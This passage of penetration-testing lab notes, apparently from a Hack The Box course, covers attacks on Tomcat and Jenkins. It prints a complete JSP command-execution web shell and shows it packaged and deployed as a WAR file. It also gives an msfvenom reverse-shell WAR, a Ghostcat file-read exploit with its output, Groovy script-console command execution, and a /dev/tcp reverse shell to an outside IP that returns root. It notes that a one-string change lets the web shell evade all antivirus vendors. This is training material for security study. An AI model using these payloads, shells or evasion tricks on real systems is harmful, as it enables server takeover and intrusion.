</code></pre></div> <hr> <h2 id=tomcat-manager-war-file-upload>Tomcat Manager - WAR File Upload<a class=headerlink href=#tomcat-manager-war-file-upload title="Permanent link">&para;</a></h2> <p>Many Tomcat installations provide a GUI interface to manage the application. This interface is available at <strong>/manager/html</strong> by default, which only users assigned the <strong>manager-gui</strong> role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.</p> <p>The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as <a href=https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp>this</a> can be downloaded and placed within the archive.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=o>&lt;%</span><span class=err>@</span><span class=w> </span><span class=n>page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&quot;java.util.*,java.io.*&quot;</span><span class=o>%&gt;</span><span class=w></span>
<a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a><span class=o>&lt;%</span><span class=w></span>
<a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a><span class=c1>//</span><span class=w></span>
<a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a><span class=c1>// JSP_KIT</span><span class=w></span>
<a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=c1>//</span><span class=w></span>
<a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=c1>// cmd.jsp = Command Execution (unix)</span><span class=w></span>
<a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a><span class=c1>//</span><span class=w></span>
<a id=__codelineno-13-8 name=__codelineno-13-8 href=#__codelineno-13-8></a><span class=c1>// by: Unknown</span><span class=w></span>
<a id=__codelineno-13-9 name=__codelineno-13-9 href=#__codelineno-13-9></a><span class=c1>// modified: 27/06/2003</span><span class=w></span>
<a id=__codelineno-13-10 name=__codelineno-13-10 href=#__codelineno-13-10></a><span class=c1>//</span><span class=w></span>
<a id=__codelineno-13-11 name=__codelineno-13-11 href=#__codelineno-13-11></a><span class=o>%&gt;</span><span class=w></span>
<a id=__codelineno-13-12 name=__codelineno-13-12 href=#__codelineno-13-12></a><span class=o>&lt;</span><span class=n>HTML</span><span class=o>&gt;&lt;</span><span class=n>BODY</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-13 name=__codelineno-13-13 href=#__codelineno-13-13></a><span class=o>&lt;</span><span class=n>FORM</span><span class=w> </span><span class=n>METHOD</span><span class=o>=</span><span class=s>&quot;GET&quot;</span><span class=w> </span><span class=n>NAME</span><span class=o>=</span><span class=s>&quot;myform&quot;</span><span class=w> </span><span class=n>ACTION</span><span class=o>=</span><span class=s>&quot;&quot;</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-14 name=__codelineno-13-14 href=#__codelineno-13-14></a><span class=o>&lt;</span><span class=n>INPUT</span><span class=w> </span><span class=n>TYPE</span><span class=o>=</span><span class=s>&quot;text&quot;</span><span class=w> </span><span class=n>NAME</span><span class=o>=</span><span class=s>&quot;cmd&quot;</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-15 name=__codelineno-13-15 href=#__codelineno-13-15></a><span class=o>&lt;</span><span class=n>INPUT</span><span class=w> </span><span class=n>TYPE</span><span class=o>=</span><span class=s>&quot;submit&quot;</span><span class=w> </span><span class=n>VALUE</span><span class=o>=</span><span class=s>&quot;Send&quot;</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-16 name=__codelineno-13-16 href=#__codelineno-13-16></a><span class=o>&lt;/</span><span class=n>FORM</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-17 name=__codelineno-13-17 href=#__codelineno-13-17></a><span class=o>&lt;</span><span class=n>pre</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-18 name=__codelineno-13-18 href=#__codelineno-13-18></a><span class=o>&lt;%</span><span class=w></span>
<a id=__codelineno-13-19 name=__codelineno-13-19 href=#__codelineno-13-19></a><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&quot;cmd&quot;</span><span class=p>)</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w></span>
<a id=__codelineno-13-20 name=__codelineno-13-20 href=#__codelineno-13-20></a><span class=w>        </span><span class=n>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&quot;Command: &quot;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&quot;cmd&quot;</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&quot;&lt;BR&gt;&quot;</span><span class=p>);</span><span class=w></span>
<a id=__codelineno-13-21 name=__codelineno-13-21 href=#__codelineno-13-21></a><span class=w>        </span><span class=n>Process</span><span class=w> </span><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&quot;cmd&quot;</span><span class=p>));</span><span class=w></span>
<a id=__codelineno-13-22 name=__codelineno-13-22 href=#__codelineno-13-22></a><span class=w>        </span><span class=n>OutputStream</span><span class=w> </span><span class=n>os</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>p</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>();</span><span class=w></span>
<a id=__codelineno-13-23 name=__codelineno-13-23 href=#__codelineno-13-23></a><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>p</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>();</span><span class=w></span>
<a id=__codelineno-13-24 name=__codelineno-13-24 href=#__codelineno-13-24></a><span class=w>        </span><span class=n>DataInputStream</span><span class=w> </span><span class=n>dis</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>DataInputStream</span><span class=p>(</span><span class=n>in</span><span class=p>);</span><span class=w></span>
<a id=__codelineno-13-25 name=__codelineno-13-25 href=#__codelineno-13-25></a><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>disr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>dis</span><span class=p>.</span><span class=na>readLine</span><span class=p>();</span><span class=w></span>
<a id=__codelineno-13-26 name=__codelineno-13-26 href=#__codelineno-13-26></a><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=w> </span><span class=n>disr</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w></span>
<a id=__codelineno-13-27 name=__codelineno-13-27 href=#__codelineno-13-27></a><span class=w>                </span><span class=n>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>disr</span><span class=p>);</span><span class=w> </span>
<a id=__codelineno-13-28 name=__codelineno-13-28 href=#__codelineno-13-28></a><span class=w>                </span><span class=n>disr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>dis</span><span class=p>.</span><span class=na>readLine</span><span class=p>();</span><span class=w> </span>
<a id=__codelineno-13-29 name=__codelineno-13-29 href=#__codelineno-13-29></a><span class=w>                </span><span class=p>}</span><span class=w></span>
<a id=__codelineno-13-30 name=__codelineno-13-30 href=#__codelineno-13-30></a><span class=w>        </span><span class=p>}</span><span class=w></span>
<a id=__codelineno-13-31 name=__codelineno-13-31 href=#__codelineno-13-31></a><span class=o>%&gt;</span><span class=w></span>
<a id=__codelineno-13-32 name=__codelineno-13-32 href=#__codelineno-13-32></a><span class=o>&lt;/</span><span class=n>pre</span><span class=o>&gt;</span><span class=w></span>
<a id=__codelineno-13-33 name=__codelineno-13-33 href=#__codelineno-13-33></a><span class=o>&lt;/</span><span class=n>BODY</span><span class=o>&gt;&lt;/</span><span class=n>HTML</span><span class=o>&gt;</span><span class=w></span>
</code></pre></div> <div class=highlight><pre><span></span><code><a id=__codelineno-14-1 name=__codelineno-14-1 href=#__codelineno-14-1></a><span class=gp>hrmns@htb[/htb]$ </span>wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
<a id=__codelineno-14-2 name=__codelineno-14-2 href=#__codelineno-14-2></a><span class=gp>hrmns@htb[/htb]$ </span>zip -r backup.war cmd.jsp 
<a id=__codelineno-14-3 name=__codelineno-14-3 href=#__codelineno-14-3></a>
<a id=__codelineno-14-4 name=__codelineno-14-4 href=#__codelineno-14-4></a><span class=go>  adding: cmd.jsp (deflated 81%)</span>
</code></pre></div> <p>Click on <strong>Browse</strong> to select the .war file and then click on <strong>Deploy</strong>.</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png></p> <p>This file is uploaded to the manager GUI, after which the <strong>/backup</strong> application will be added to the table.</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/war_deployed.png></p> <p>If we click on <strong>backup</strong>, we will get redirected to <strong>http://web01.inlanefreight.local:8180/backup/</strong> and get a <strong>404 Not Found</strong> error. We need to specify the <strong>cmd.jsp</strong> file in the URL as well. Browsing to <strong>http://web01.inlanefreight.local:8180/backup/cmd.jsp</strong> will present us with a web shell that we can use to run commands on the Tomcat server</p> <div class=highlight><pre><span></span><code><a id=__codelineno-15-1 name=__codelineno-15-1 href=#__codelineno-15-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd<span class=o>=</span>id
<a id=__codelineno-15-2 name=__codelineno-15-2 href=#__codelineno-15-2></a>
<a id=__codelineno-15-3 name=__codelineno-15-3 href=#__codelineno-15-3></a><span class=go>&lt;HTML&gt;&lt;BODY&gt;</span>
<a id=__codelineno-15-4 name=__codelineno-15-4 href=#__codelineno-15-4></a><span class=go>&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span>
<a id=__codelineno-15-5 name=__codelineno-15-5 href=#__codelineno-15-5></a><span class=go>&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;</span>
<a id=__codelineno-15-6 name=__codelineno-15-6 href=#__codelineno-15-6></a><span class=go>&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span>
<a id=__codelineno-15-7 name=__codelineno-15-7 href=#__codelineno-15-7></a><span class=go>&lt;/FORM&gt;</span>
<a id=__codelineno-15-8 name=__codelineno-15-8 href=#__codelineno-15-8></a><span class=go>&lt;pre&gt;</span>
<a id=__codelineno-15-9 name=__codelineno-15-9 href=#__codelineno-15-9></a><span class=go>Command: id&lt;BR&gt;</span>
<a id=__codelineno-15-10 name=__codelineno-15-10 href=#__codelineno-15-10></a><span class=go>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)</span>
<a id=__codelineno-15-11 name=__codelineno-15-11 href=#__codelineno-15-11></a>
<a id=__codelineno-15-12 name=__codelineno-15-12 href=#__codelineno-15-12></a><span class=go>&lt;/pre&gt;</span>
<a id=__codelineno-15-13 name=__codelineno-15-13 href=#__codelineno-15-13></a><span class=go>&lt;/BODY&gt;&lt;/HTML&gt;</span>
</code></pre></div> <p>To clean up after ourselves, we can go back to the main Tomcat Manager page and click the <strong>Undeploy</strong> button next to the <strong>backups</strong> application after, of course, noting down the file and upload location for our report, which in our example is <strong>/opt/tomcat/apache-tomcat-10.0.10/webapps</strong>. If we do an <strong>ls</strong> on that directory from our web shell, we'll see the uploaded <strong>backup.war</strong> file and the <strong>backup</strong> directory containing the <strong>cmd.jsp</strong> script and <strong>META-INF</strong> created after the application deploys. Clicking on <strong>Undeploy</strong> will typically remove the uploaded WAR archive and the directory associated with the application.</p> <p>Could also use msfvenom to generate a malicious WAR file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-16-1 name=__codelineno-16-1 href=#__codelineno-16-1></a><span class=gp>hrmns@htb[/htb]$ </span>msfvenom -p java/jsp_shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span><span class=m>10</span>.10.14.15 <span class=nv>LPORT</span><span class=o>=</span><span class=m>4443</span> -f war &gt; backup.war
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a>
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a><span class=go>Payload size: 1098 bytes</span>
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a><span class=go>Final size of war file: 1098 bytes</span>
</code></pre></div> <p>Start a Netcat listener and click on <strong>/backup</strong> to execute the shell.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a><span class=gp>hrmns@htb[/htb]$ </span>nc -lnvp <span class=m>4443</span>
<a id=__codelineno-17-2 name=__codelineno-17-2 href=#__codelineno-17-2></a>
<a id=__codelineno-17-3 name=__codelineno-17-3 href=#__codelineno-17-3></a><span class=go>listening on [any] 4443 ...</span>
<a id=__codelineno-17-4 name=__codelineno-17-4 href=#__codelineno-17-4></a><span class=go>connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224</span>
<a id=__codelineno-17-5 name=__codelineno-17-5 href=#__codelineno-17-5></a>
<a id=__codelineno-17-6 name=__codelineno-17-6 href=#__codelineno-17-6></a>
<a id=__codelineno-17-7 name=__codelineno-17-7 href=#__codelineno-17-7></a><span class=go>id</span>
<a id=__codelineno-17-8 name=__codelineno-17-8 href=#__codelineno-17-8></a>
<a id=__codelineno-17-9 name=__codelineno-17-9 href=#__codelineno-17-9></a><span class=go>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)</span>
</code></pre></div> <hr> <blockquote> <p>The <strong>multi/http/tomcat_mgr_upload</strong> Metasploit module can be used to automate this process.</p> </blockquote> <hr> <p><a href=https://github.com/SecurityRiskAdvisors/cmd.jsp>This</a> JSP web shell is very lightweight (under 1kb) and utilizes a <a href=https://www.freecodecamp.org/news/what-are-bookmarklets/ >Bookmarklet</a> or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded <strong>cmd.jsp</strong> would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).</p> <p>The web shell as is only gets detected by 2/58 anti-virus vendors.</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/vt2.png></p> <p>A simple change such as changing:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=n>stream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>m</span><span class=p>);</span><span class=n>o</span><span class=o>=</span><span class=s>&quot;Uploaded:</span>
</code></pre></div> <p>to</p> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>f</span><span class=p>);</span><span class=n>stream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>m</span><span class=p>);</span><span class=n>o</span><span class=o>=</span><span class=s>&quot;uPlOaDeD:</span>
</code></pre></div> <p>results in 0/58 security vendors flagging the <strong>cmd.jsp</strong> file as malicious at the time of writing.</p> <hr> <p>Quick Note on Web shells</p> <p>When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don't want an attacker to come across our web shell and leverage it to gain their own foothold.</p> <hr> <h2 id=cve-2020-1938-ghostcat>CVE-2020-1938 : Ghostcat<a class=headerlink href=#cve-2020-1938-ghostcat title="Permanent link">&para;</a></h2> <p>Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">Ghostcat</a>. All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.</p> <p>AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a><span class=gp>hrmns@htb[/htb]$ </span>nmap -sV -p <span class=m>8009</span>,8080 app-dev.inlanefreight.local
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a>
<a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a><span class=go>Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT</span>
<a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a><span class=go>Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)</span>
<a id=__codelineno-20-5 name=__codelineno-20-5 href=#__codelineno-20-5></a><span class=go>Host is up (0.14s latency).</span>
<a id=__codelineno-20-6 name=__codelineno-20-6 href=#__codelineno-20-6></a>
<a id=__codelineno-20-7 name=__codelineno-20-7 href=#__codelineno-20-7></a><span class=go>PORT     STATE SERVICE VERSION</span>
<a id=__codelineno-20-8 name=__codelineno-20-8 href=#__codelineno-20-8></a><span class=go>8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span>
<a id=__codelineno-20-9 name=__codelineno-20-9 href=#__codelineno-20-9></a><span class=go>8080/tcp open  http    Apache Tomcat 9.0.30</span>
<a id=__codelineno-20-10 name=__codelineno-20-10 href=#__codelineno-20-10></a>
<a id=__codelineno-20-11 name=__codelineno-20-11 href=#__codelineno-20-11></a><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<a id=__codelineno-20-12 name=__codelineno-20-12 href=#__codelineno-20-12></a><span class=go>Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds</span>
</code></pre></div> <p>The PoC code for the vulnerability can be found <a href=https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi>here</a>. The exploit can only read files and folders within the web apps folder, which means that files like <strong>/etc/passwd</strong> can’t be accessed. Let’s attempt to access the web.xml.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a><span class=gp>hrmns@htb[/htb]$ </span>python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p <span class=m>8009</span> -f WEB-INF/web.xml 
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>
<a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a><span class=go>Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf</span>
<a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a><span class=go>----------------------------</span>
<a id=__codelineno-21-5 name=__codelineno-21-5 href=#__codelineno-21-5></a><span class=go>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<a id=__codelineno-21-6 name=__codelineno-21-6 href=#__codelineno-21-6></a><span class=go>&lt;!--</span>
<a id=__codelineno-21-7 name=__codelineno-21-7 href=#__codelineno-21-7></a><span class=go> Licensed to the Apache Software Foundation (ASF) under one or more</span>
<a id=__codelineno-21-8 name=__codelineno-21-8 href=#__codelineno-21-8></a><span class=go>  contributor license agreements.  See the NOTICE file distributed with</span>
<a id=__codelineno-21-9 name=__codelineno-21-9 href=#__codelineno-21-9></a><span class=go>  this work for additional information regarding copyright ownership.</span>
<a id=__codelineno-21-10 name=__codelineno-21-10 href=#__codelineno-21-10></a><span class=go>  The ASF licenses this file to You under the Apache License, Version 2.0</span>
<a id=__codelineno-21-11 name=__codelineno-21-11 href=#__codelineno-21-11></a><span class=go>  (the &quot;License&quot;); you may not use this file except in compliance with</span>
<a id=__codelineno-21-12 name=__codelineno-21-12 href=#__codelineno-21-12></a><span class=go>  the License.  You may obtain a copy of the License at</span>
<a id=__codelineno-21-13 name=__codelineno-21-13 href=#__codelineno-21-13></a>
<a id=__codelineno-21-14 name=__codelineno-21-14 href=#__codelineno-21-14></a><span class=go>      http://www.apache.org/licenses/LICENSE-2.0</span>
<a id=__codelineno-21-15 name=__codelineno-21-15 href=#__codelineno-21-15></a>
<a id=__codelineno-21-16 name=__codelineno-21-16 href=#__codelineno-21-16></a><span class=go>  Unless required by applicable law or agreed to in writing, software</span>
<a id=__codelineno-21-17 name=__codelineno-21-17 href=#__codelineno-21-17></a><span class=go>  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span>
<a id=__codelineno-21-18 name=__codelineno-21-18 href=#__codelineno-21-18></a><span class=go>  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span>
<a id=__codelineno-21-19 name=__codelineno-21-19 href=#__codelineno-21-19></a><span class=go>  See the License for the specific language governing permissions and</span>
<a id=__codelineno-21-20 name=__codelineno-21-20 href=#__codelineno-21-20></a><span class=go>  limitations under the License.</span>
<a id=__codelineno-21-21 name=__codelineno-21-21 href=#__codelineno-21-21></a><span class=go>--&gt;</span>
<a id=__codelineno-21-22 name=__codelineno-21-22 href=#__codelineno-21-22></a><span class=go>&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span>
<a id=__codelineno-21-23 name=__codelineno-21-23 href=#__codelineno-21-23></a><span class=go>  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
<a id=__codelineno-21-24 name=__codelineno-21-24 href=#__codelineno-21-24></a><span class=go>  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span>
<a id=__codelineno-21-25 name=__codelineno-21-25 href=#__codelineno-21-25></a><span class=go>                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span>
<a id=__codelineno-21-26 name=__codelineno-21-26 href=#__codelineno-21-26></a><span class=go>  version=&quot;4.0&quot;</span>
<a id=__codelineno-21-27 name=__codelineno-21-27 href=#__codelineno-21-27></a><span class=go>  metadata-complete=&quot;true&quot;&gt;</span>
<a id=__codelineno-21-28 name=__codelineno-21-28 href=#__codelineno-21-28></a>
<a id=__codelineno-21-29 name=__codelineno-21-29 href=#__codelineno-21-29></a><span class=go>  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;</span>
<a id=__codelineno-21-30 name=__codelineno-21-30 href=#__codelineno-21-30></a><span class=go>  &lt;description&gt;</span>
<a id=__codelineno-21-31 name=__codelineno-21-31 href=#__codelineno-21-31></a><span class=go>     Welcome to Tomcat</span>
<a id=__codelineno-21-32 name=__codelineno-21-32 href=#__codelineno-21-32></a><span class=go>  &lt;/description&gt;</span>
<a id=__codelineno-21-33 name=__codelineno-21-33 href=#__codelineno-21-33></a>
<a id=__codelineno-21-34 name=__codelineno-21-34 href=#__codelineno-21-34></a><span class=go>&lt;/web-app&gt;</span>
</code></pre></div> <p>In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.</p> <hr> <h1 id=jenkins>Jenkins<a class=headerlink href=#jenkins title="Permanent link">&para;</a></h1> <p><a href=https://www.jenkins.io/ >Jenkins</a> is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat.</p> <hr> <h2 id=discoveryfootprinting>Discovery/Footprinting<a class=headerlink href=#discoveryfootprinting title="Permanent link">&para;</a></h2> <p>It is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.</p> <p>Jenkins runs on Tomcat port 8080 by default. Utilizes port 5000 to attach slave servers. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.</p> <hr> <h2 id=enumeration_1>Enumeration<a class=headerlink href=#enumeration_1 title="Permanent link">&para;</a></h2> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/jenkins_global_security.png></p> <p>Default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/jenkins_login.png></p> <p>May encounter a Jenkins instance that uses weak or default credentials such as <strong>admin:admin</strong> or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test.</p> <hr> <h2 id=attacking-jenkins>Attacking Jenkins<a class=headerlink href=#attacking-jenkins title="Permanent link">&para;</a></h2> <p>Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the <a href=https://www.jenkins.io/doc/book/managing/script-console/ >Script Console</a>. Allows to run arbitrary Groovy scripts within the Jenkins controller runtime. Can be abused to run operating system commands on the underlying server.</p> <hr> <h2 id=script-console>Script Console<a class=headerlink href=#script-console title="Permanent link">&para;</a></h2> <p>Script console can be reached at the URL <strong>http://jenkins.inlanefreight.local:8000/script</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a><span class=kt>def</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w></span>
<a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a><span class=kt>def</span><span class=w> </span><span class=n>sout</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuffer</span><span class=o>(),</span><span class=w> </span><span class=n>serr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuffer</span><span class=o>()</span><span class=w></span>
<a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a><span class=kt>def</span><span class=w> </span><span class=n>proc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cmd</span><span class=o>.</span><span class=na>execute</span><span class=o>()</span><span class=w></span>
<a id=__codelineno-22-4 name=__codelineno-22-4 href=#__codelineno-22-4></a><span class=n>proc</span><span class=o>.</span><span class=na>consumeProcessOutput</span><span class=o>(</span><span class=n>sout</span><span class=o>,</span><span class=w> </span><span class=n>serr</span><span class=o>)</span><span class=w></span>
<a id=__codelineno-22-5 name=__codelineno-22-5 href=#__codelineno-22-5></a><span class=n>proc</span><span class=o>.</span><span class=na>waitForOrKill</span><span class=o>(</span><span class=mi>1000</span><span class=o>)</span><span class=w></span>
<a id=__codelineno-22-6 name=__codelineno-22-6 href=#__codelineno-22-6></a><span class=n>println</span><span class=w> </span><span class=n>sout</span><span class=w></span>
</code></pre></div> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/113/groovy_web.png></p> <p>There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or <a href=https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console>this</a> Metasploit module.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a><span class=n>r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=o>.</span><span class=na>getRuntime</span><span class=o>()</span><span class=w></span>
<a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a><span class=n>p</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>r</span><span class=o>.</span><span class=na>exec</span><span class=o>([</span><span class=s2>&quot;/bin/bash&quot;</span><span class=o>,</span><span class=s2>&quot;-c&quot;</span><span class=o>,</span><span class=s2>&quot;exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class=o>]</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>String</span><span class=o>[])</span><span class=w></span>
<a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a><span class=n>p</span><span class=o>.</span><span class=na>waitFor</span><span class=o>()</span><span class=w></span>
</code></pre></div> <p>Running above cmds results in a revshell</p> <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a><span class=gp>hrmns@htb[/htb]$ </span>nc -lvnp <span class=m>8443</span>
<a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a>
<a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a><span class=go>listening on [any] 8443 ...</span>
<a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a><span class=go>connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844</span>
<a id=__codelineno-24-5 name=__codelineno-24-5 href=#__codelineno-24-5></a>
<a id=__codelineno-24-6 name=__codelineno-24-6 href=#__codelineno-24-6></a><span class=go>id</span>
<a id=__codelineno-24-7 name=__codelineno-24-7 href=#__codelineno-24-7></a>
<a id=__codelineno-24-8 name=__codelineno-24-8 href=#__codelineno-24-8></a><span class=go>uid=0(root) gid=0(root) groups=0(root)</span>
<a id=__codelineno-24-9 name=__codelineno-24-9 href=#__codelineno-24-9></a>
